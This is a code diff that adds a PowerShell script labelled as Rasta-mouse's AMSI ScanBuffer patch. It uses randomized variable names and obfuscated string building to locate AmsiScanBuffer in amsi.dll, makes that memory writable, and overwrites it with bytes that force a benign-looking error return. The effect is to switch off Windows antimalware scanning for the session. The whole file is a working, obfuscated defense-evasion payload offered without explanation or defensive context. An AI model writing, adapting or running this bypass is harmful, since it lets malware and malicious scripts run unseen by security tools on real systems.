@@ -1,0 +1,28 @@
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$fhfyc = @"
+using System;
+using System.Runtime.InteropServices;
+public class fhfyc {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ixajmz, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $fhfyc
+
+$nzwtgvd = [fhfyc]::LoadLibrary("$(('ãmsí.'+'dll').NOrmAlizE([cHaR](70*31/31)+[char](111)+[Char]([Byte]0x72)+[CHaR](109+60-60)+[ChaR](54+14)) -replace [chaR]([bYTE]0x5c)+[CHar]([bYTE]0x70)+[ChAR](123+2-2)+[CHar]([byte]0x4d)+[ChAR]([bYTE]0x6e)+[char]([byTE]0x7d))")
+$njywgo = [fhfyc]::GetProcAddress($nzwtgvd, "$(('ÁmsìSc'+'änBuff'+'er').NOrmALIzE([CHaR]([bYTE]0x46)+[Char]([bYTe]0x6f)+[cHAr]([bYTE]0x72)+[CHar](109)+[cHaR]([ByTe]0x44)) -replace [chAR](92)+[Char]([byTE]0x70)+[chaR]([bYTE]0x7b)+[chaR]([BYtE]0x4d)+[char](21+89)+[chaR](31+94))")
+$p = 0
+[fhfyc]::VirtualProtect($njywgo, [uint32]5, 0x40, [ref]$p)
+$haly = "0xB8"
+$ddng = "0x57"
+$xdeq = "0x00"
+$mbrf = "0x07"
+$ewaq = "0x80"
+$fqzt = "0xC3"
+$yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
+[System.Runtime.InteropServices.Marshal]::Copy($yfnjb, 0, $njywgo, 6)
